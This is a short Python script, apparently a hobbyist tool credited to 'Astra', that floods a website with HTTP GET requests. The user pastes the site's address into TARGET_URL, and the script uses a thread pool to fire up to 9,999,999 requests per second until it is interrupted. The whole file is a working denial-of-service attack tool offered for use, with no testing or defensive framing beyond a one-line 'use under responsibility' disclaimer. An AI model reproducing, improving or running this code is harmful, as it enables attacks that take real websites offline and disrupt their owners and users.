import requests
import threading
import concurrent.futures
import time
import signal
import sys


#      ░█████╗░░██████╗████████╗██████╗░░█████╗░
#      ██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██╔══██╗
#      ███████║╚█████╗░░░░██║░░░██████╔╝███████║
#      ██╔══██║░╚═══██╗░░░██║░░░██╔══██╗██╔══██║
#      ██║░░██║██████╔╝░░░██║░░░██║░░██║██║░░██║
#      ╚═╝░░╚═╝╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝                                
# Desarrollado por Astra 🖤 - usarlo bajo responsabilidad

TARGET_URL = "Pegar url de la web aqui"

REQUESTS_PER_SECOND = 9999999

running = True

def send_request():
    try:
        response = requests.get(TARGET_URL)
        print(f"Request {response.status_code} - {response.elapsed.total_seconds()}s")
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")

def flood_server():
    with concurrent.futures.ThreadPoolExecutor(max_workers=REQUESTS_PER_SECOND) as executor:
        while running:
            futures = [executor.submit(send_request) for _ in range(REQUESTS_PER_SECOND)]
            concurrent.futures.wait(futures)
            time.sleep(1)  

def signal_handler(sig, frame):
    global running
    print("\nstopp...")
    running = False
    sys.exit(0)

if __name__ == "__main__":
    print("Gooo..")
    signal.signal(signal.SIGINT, signal_handler)
    flood_server()
